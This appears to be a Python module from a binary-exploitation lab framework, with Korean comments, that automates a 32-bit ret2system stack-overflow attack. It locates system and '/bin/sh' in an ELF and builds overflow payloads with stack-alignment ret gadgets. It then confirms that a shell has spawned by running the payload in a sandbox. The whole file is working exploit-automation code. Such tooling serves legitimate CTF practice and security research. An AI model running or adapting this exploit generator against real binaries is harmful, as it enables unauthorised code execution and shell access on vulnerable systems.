"""완전 자동 i386(32-bit) ret2system 오케스트레이션 (system("/bin/sh") → 셸).

32-bit cdecl 은 인자를 스택으로 넘기므로 amd64 의 ``pop rdi`` 가젯이 필요 없다.
반환 주소를 ``system`` 으로 덮고 그 뒤에 ``[반환주소][&"/bin/sh"]`` 를 쌓으면
``system("/bin/sh")`` 가 성립한다. PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려
**셸 획득을 직접 증명**한다(amd64 ret2system 코어와 동일한 셸 증명 구조).
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import find_ret_gadget, is_pie, ret2system_plan32
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.runner import SandboxLimits, verify_shell


def auto_ret2system32(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """i386 바이너리에 대해 ret2system 을 자동 구성·검증한다(셸 획득까지 증명)."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 32:
        return {"attempted": False, "reason": "i386-only"}
    if is_pie(image):
        # 32-bit PIE 는 base leak 이 필요하다(절대주소 전제 불가). 여기서는 거부.
        return {"attempted": False, "reason": "pie-needs-base-leak"}
    plan = ret2system_plan32(image)
    if plan is None:
        return {"attempted": False, "reason": "no-ret2system-plan"}

    limits = limits or SandboxLimits()
    system, binsh = plan["system"], plan["binsh"]
    # system 반환 후 돌아갈 주소(셸 증명 중엔 실행되지 않음). 있으면 exit 로, 없으면
    # 눈에 띄는 junk(크래시 진단용)로 채운다.
    exit_sym = image.symbol("exit")
    ret_after = exit_sym.addr if exit_sym and exit_sym.addr else 0xDEADBEEF

    # SysV i386 ABI 는 call 지점 16바이트 스택 정렬을 요구한다(gcc 는 movdqa/movaps
    # 로 이를 전제) — ROP `ret` 은 그 정렬을 보장하지 못해 system 진입 후 SIGSEGV
    # 로 죽을 수 있다(amd64 movaps 정렬 함정의 i386 판). `ret` 가젯을 0~3개 앞에
    # 끼워 esp 를 4바이트씩 밀며 네 가지 정렬을 모두 시도한다(각 `ret` 은 한 슬롯을
    # 소비하고 다음으로 점프). 셸이 뜨는 첫 정렬을 채택한다.
    ret_gadget = find_ret_gadget(image)
    max_pad = 3 if ret_gadget is not None else 0

    for pad in range(max_pad + 1):
        # cdecl: [padding][ret]*pad[system][ret_after][&"/bin/sh"]
        targets = [ret_gadget] * pad + [system, ret_after, binsh]
        payload = build_overflow(
            offset, targets[0], bits=32, chain=[RopStep(t) for t in targets[1:]]
        )
        marker = "PWNPILOT_" + secrets.token_hex(4)
        proof = verify_shell(binary_path, payload, marker=marker, limits=limits)
        if proof.shell_spawned:
            return _report(plan, ret_after, pad, True, "shell-proven", proof.as_dict())

    return _report(plan, ret_after, 0, False, "did-not-spawn-shell", None)


def _report(
    plan: dict,
    ret_after: int,
    align_pad: int,
    succeeded: bool,
    reason: str,
    shell_proof: dict | None,
) -> dict:
    report = {
        "attempted": True,
        "technique": "ret2system",
        "bits": 32,
        "system_hex": f"0x{plan['system']:x}",
        "binsh_hex": f"0x{plan['binsh']:x}",
        "ret_after_hex": f"0x{ret_after:x}",
        "alignment_ret_pad": align_pad,
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
    }
    if shell_proof is not None:
        report["shell_proof"] = shell_proof
    return report
